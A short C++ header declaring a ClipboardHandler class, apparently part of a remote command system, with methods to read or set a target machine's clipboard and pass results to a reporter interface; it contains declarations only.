#pragma once

#include <string>

#include "domain/common/Result.hpp"
#include "application/interfaces/IReporter.hpp"
#include "application/interfaces/IClipboardService.hpp"

namespace nuub::application::commands {

class ClipboardHandler {
    interfaces::IClipboardService& clipboard_;
    interfaces::IReporter& reporter_;
    std::string pc_id_;

    [[nodiscard]] bool matches(const std::string& target) const;

public:
    ClipboardHandler(
        interfaces::IClipboardService& clipboard,
        interfaces::IReporter& reporter,
        std::string pc_id);

    domain::Result<void> handle_clipboard(const std::string& target);
    domain::Result<void> handle_setclip(const std::string& target, const std::string& text);
};

} // namespace nuub::application::commands
